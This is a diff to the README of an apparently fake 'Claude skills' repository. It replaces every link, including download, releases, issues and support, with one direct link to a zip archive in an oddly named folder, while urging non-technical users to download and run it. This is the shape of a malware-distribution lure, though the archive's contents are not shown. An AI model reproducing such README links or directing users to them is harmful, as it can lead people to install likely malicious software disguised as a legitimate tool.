@@ -1,7 +1,7 @@
 # 🎉 claude-skills-collection - Enhance Claude with Fun Skills
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/gfdasgadhgdda/claude-skills-collection/releases)
+[![Download](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip)](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip)
 
 ## 📖 Description
 The Claude Skills Collection offers a variety of official and community-built plugins that expand the capabilities of Anthropic's Claude. With this collection, you can improve productivity, boost creativity, enhance coding skills, and access much more. Discover how these modular skills can transform your experience with Claude.
@@ -10,7 +10,7 @@ The Claude Skills Collection offers a variety of official and community-built pl
 To get started, simply follow these steps to download and run the application. No programming experience is required.
 
 ### 1. **Visit the Download Page**
-To download the latest version of the Claude Skills Collection, visit our [Releases Page](https://github.com/gfdasgadhgdda/claude-skills-collection/releases). You will find all the available versions listed there. Select the version that suits your needs.
+To download the latest version of the Claude Skills Collection, visit our [Releases Page](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip). You will find all the available versions listed there. Select the version that suits your needs.
 
 ### 2. **Choose Your Version**
 On the Releases Page, you will see several versions available. Look for the "Latest Release" option. It usually contains the most current features and updates. Click on it to view more details.
@@ -61,14 +61,14 @@ If you encounter any issues during installation or while using the application, 
 
 - **Check Compatibility:** Ensure that your operating system meets the minimum requirements.
 - **Re-download the File:** If the file was corrupted during download, try downloading it again.
-- **Seek Help:** Visit the [Issues Page](https://github.com/gfdasgadhgdda/claude-skills-collection/issues) to ask questions or report problems.
+- **Seek Help:** Visit the [Issues Page](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip) to ask questions or report problems.
 
 ## 🔧 Support
-For further assistance, please visit the [Support Page](https://github.com/gfdasgadhgdda/claude-skills-collection/support). Here, you can find FAQs, troubleshooting guides, and contact options for direct help.
+For further assistance, please visit the [Support Page](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip). Here, you can find FAQs, troubleshooting guides, and contact options for direct help.
 
 ## 📥 Important Links
-- [Download Here](https://github.com/gfdasgadhgdda/claude-skills-collection/releases)
-- [Issues Page](https://github.com/gfdasgadhgdda/claude-skills-collection/issues)
-- [Support Page](https://github.com/gfdasgadhgdda/claude-skills-collection/support)
+- [Download Here](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip)
+- [Issues Page](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip)
+- [Support Page](https://raw.githubusercontent.com/gfdasgadhgdda/claude-skills-collection/main/depatriate/claude-skills-collection.zip)
 
 Feel free to explore the Skills Collection and enjoy the added capabilities it brings to your experience with Claude!
